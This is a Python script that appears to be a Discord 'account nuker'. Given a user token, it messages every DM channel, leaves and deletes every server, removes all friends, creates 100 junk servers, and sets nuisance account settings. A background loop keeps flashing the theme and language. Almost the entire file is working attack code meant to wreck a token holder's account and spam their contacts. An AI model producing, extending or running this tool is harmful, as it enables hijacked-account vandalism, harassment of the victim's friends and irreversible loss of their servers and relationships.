import os
import random
import requests
import threading
from colorama import Fore
from itertools import cycle

# Function to get headers for requests
def getheaders(token):
    return {'Authorization': token}

# Function to get proxy for requests (if needed)
def get_proxy():
    return None  # Modify this to fetch proxies if required

def GANGNUKER_START(token, Server_Name, message_Content):
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token,))
        t.start()

    headers = getheaders(token)
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/' + channel['id'] + '/messages',
                          headers=headers,
                          data={"content": f"{message_Content}"})
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] ID: " + channel['id'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/' + guild['id'],
                            headers={'Authorization': token})
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Left Server: " + guild['name'] + Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/' + guild['id'], headers=headers)
            print(f'[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Deleted: ' + guild['name'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friendIds:
        try:
            requests.delete(f'https://discord.com/api/v9/users/@me/relationships/' + friend['id'],
                            headers=headers)
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Removed Friend: " + friend['user']['username'] + "#" + friend['user']['discriminator'] + Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    for i in range(100):
        try:
            payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Created | {i}{Fore.RESET}")
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    requests.delete("https://discord.com/api/v8/hypesquad/online", headers=headers)
    setting = {
        'theme': "light",
        'locale': "ja",
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'enable_tts_command': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'message_display_compact': False,
        'explicit_content_filter': '0',
        "custom_status": {"text": "nixulum runs me <3"},
        'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
    a = j['username'] + "#" + j['discriminator']
    print(f"\n\nDone, RIP TO THAT ACCOUNT\n")
    print("[ \x1b[95m>\x1b[95m\x1B[37m ] Press ENTER: ", end="")
    spammer()


def CustomSeizure(token):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)

# Function to handle spammer
def spammer():
    input()  # Wait for user input

# Main function to get token from user and start the script
def main():
    token = input("Enter your Discord token: ")
    Server_Name = "Your Server Name"
    message_Content = "Your message content"
    GANGNUKER_START(token, Server_Name, message_Content)

# Run the main function
if __name__ == "__main__":
    main()
